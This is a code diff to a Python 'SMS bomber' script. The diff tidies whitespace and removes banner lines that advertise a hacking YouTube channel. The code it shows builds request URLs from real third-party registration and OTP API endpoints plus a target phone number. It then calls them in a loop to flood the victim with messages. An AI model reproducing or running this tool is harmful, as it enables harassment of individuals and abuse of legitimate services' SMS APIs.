@@ -29,9 +29,9 @@ def send(target, counter, delay):
     "ConfirmTkt": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
     }
 
-    failed= 0
+    failed = 0
     requested = 0
-    success= int(requested) - int(failed)
+    success = int(requested) - int(failed)
     bombs = int(counter) + 1
 
     while success != (int(bombs)):
@@ -46,14 +46,9 @@ def send(target, counter, delay):
         print("             Number of Requests Sent : ", requested)
         print("             Successful Requests     : ", success)
         print("             Failed Requests         : ", failed)
-        print("             API used to BOMB Target : ", api)
-        print("==================================================================")
-        print(".   SUBSCRIBE MY YOUTUBE CHANNEL ALKR-HACKHECKZ FOR MORE HACK     ")
-        print("         PLEASE USE THIS FOR FUN,DONT USE IT FOR REVENGE          ")
         print("==================================================================")
 
         result_url=str(bombers[api])+target
-
         try:
             requested = requested + 1
             urllib.request.urlopen(str(result_url))
